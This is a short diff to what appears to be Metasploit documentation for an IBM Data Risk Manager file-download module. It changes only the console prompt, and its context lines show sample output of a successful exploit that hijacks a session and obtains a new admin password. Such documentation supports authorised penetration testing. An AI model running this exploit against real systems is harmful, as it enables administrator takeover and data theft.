@@ -25,7 +25,7 @@ Module defaults work very well, you should just need to set `RHOST` and the `FIL
 A successful exploit will look like this:
 
 ```
-msf5 auxiliary(admin/http/ibm_drm_file_download) > run
+msf auxiliary(admin/http/ibm_drm_file_download) > run
 
 [+] 10.9.8.213:8443 - Successfully "stickied" our session ID kmhleyPh
 [+] 10.9.8.213:8443 - We have obtained a new admin password 28010e88-6ffb-46e9-90d6-2ded732120d1
